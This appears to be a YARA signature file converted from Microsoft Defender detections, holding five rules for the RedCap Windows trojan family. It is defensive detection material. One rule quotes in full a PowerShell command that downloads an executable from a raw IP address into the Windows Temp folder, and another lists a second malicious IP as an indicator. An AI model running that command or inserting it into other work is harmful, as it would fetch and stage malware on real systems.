rule Trojan_Win32_RedCap_CB_2147838918_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/RedCap.CB!MTB"
        threat_id = "2147838918"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "RedCap"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {0f b6 14 03 30 14 2f 83 c7 01 3b 7c 24 1c 72 a3}  //weight: 5, accuracy: High
        $x_3_2 = "Control Panel\\Desktop\\ResourceLocale" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_RedCap_SP_2147843099_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/RedCap.SP!MTB"
        threat_id = "2147843099"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "RedCap"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "powershell -Command \"Invoke-WebRequest -Uri 'http://146.190.48.229/fuackme100.exe' -OutFile 'C:\\Windows\\Temp\\file1.exe'\"" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_RedCap_SPH_2147846323_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/RedCap.SPH!MTB"
        threat_id = "2147846323"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "RedCap"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {c6 45 f4 47 c6 45 f5 45 c6 45 f6 54 c6 45 f7 47 c6 45 f8 4f c6 45 f9 44 ff 15 ?? ?? ?? ?? 5f 5b 85 c0 7f}  //weight: 1, accuracy: Low
        $x_1_2 = "103.59.113.33" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_RedCap_SPD_2147847626_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/RedCap.SPD!MTB"
        threat_id = "2147847626"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "RedCap"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "Noadfgioaejfigoaef" ascii //weight: 2
        $x_2_2 = "Noeajiofgseajigfesifg" ascii //weight: 2
        $x_1_3 = "WaitForSingleObject" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_RedCap_AR_2147956291_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/RedCap.AR!MTB"
        threat_id = "2147956291"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "RedCap"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_15_1 = "RR3IL6YJTKWSXB3I6KRTAAVBFXUV2Q5BBDN" ascii //weight: 15
        $x_5_2 = "TotalVisibleMemorySize=(%d+)" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

